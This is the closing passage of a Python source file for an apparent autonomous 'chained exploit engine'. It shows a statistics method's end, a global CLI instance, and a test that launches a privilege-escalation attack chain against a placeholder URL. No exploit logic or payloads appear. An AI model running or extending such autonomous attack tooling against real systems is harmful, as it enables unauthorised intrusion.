            'chain_effectiveness': dict(self.knowledge_base.chain_effectiveness)
        }

# Global instance for CLI access
chained_exploit_engine = ChainedExploitEngine()

if __name__ == "__main__":
    async def test_chained_exploit():
        """Test the chained exploit engine"""
        engine = ChainedExploitEngine()
        
        # Test autonomous attack
        result = await engine.execute_autonomous_attack(
            "https://vulnerable-app.com",
            ChainType.PRIVILEGE_ESCALATION
        )
        
        print("Chained Exploit Test Results:")
        print(json.dumps(result, indent=2))
        
        # Get statistics
        stats = engine.get_execution_statistics()
        print("\nExecution Statistics:")
        print(json.dumps(stats, indent=2))
    
    # Run test
    asyncio.run(test_chained_exploit())